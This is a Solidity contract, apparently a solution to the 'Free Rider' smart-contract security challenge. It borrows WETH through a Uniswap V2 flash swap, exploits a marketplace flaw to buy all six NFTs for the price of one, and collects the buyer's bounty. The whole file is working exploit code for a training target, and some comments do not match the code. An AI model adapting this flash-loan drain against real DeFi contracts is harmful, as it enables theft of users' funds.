// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract FreeRiderAttacker is IERC721Receiver {
    IWETH public immutable weth;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderBuyer public immutable buyer;
    IERC721 public immutable nft;
    IUniswapV2Pair public uniswapPair;

    constructor(
        address _wethAddress,
        address payable _marketplaceAddress,
        address _buyerAddress,
        address _nftAddress,
        address _uniswapPairAddress
    ) {
        weth = IWETH(_wethAddress);
        marketplace = FreeRiderNFTMarketplace(_marketplaceAddress);
        buyer = FreeRiderBuyer(_buyerAddress);
        nft = IERC721(_nftAddress);
        uniswapPair = IUniswapV2Pair(_uniswapPairAddress);
    }

    receive() external payable {}

    function attack(uint256 _value) public {
        /**
         * In uniswap we have traditional swap function and 
         * flash swap. Both of them use swap function, but the
         * difference in call of them is inside the last parametr
         * bytes calldate data. When data == bytes(0), then function 
         * will be swap, when this variable will be anything
         * different, than it will be flash swap.Therefor,
         * we set data = '1', but the number 1 was selected
         * arbitrary. It could be any number or letter.
         * After, we borrow weth in amount defined by
         * _value and call implemented by us, a function 
         * uniswapV2Call
         */
        bytes memory data = "a";
        uniswapPair.swap(_value, 0, address(this), data);
    }

    function uniswapV2Call(
        address,
        uint256 _value,
        uint256,
        bytes calldata
    ) external {
        // Change weth to ethe
        weth.withdraw(_value);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }

        // Buy all NFT from the marketplace
        marketplace.buyMany{value: _value}(tokenIds);

        // Calculate the amount to paid back to uniswap
        uint256 valueToBack = ((_value * 3) / 100) + _value;

        // Change require amount of eth to weth, and send it
        weth.deposit{value: valueToBack}();
        weth.transfer(address(uniswapPair), valueToBack);

        // Transfer all NFT to buyer
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }

        (bool ethSent, ) = msg.sender.call{value: address(this).balance}("");
    }

    // We need this function to receive the NFT
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
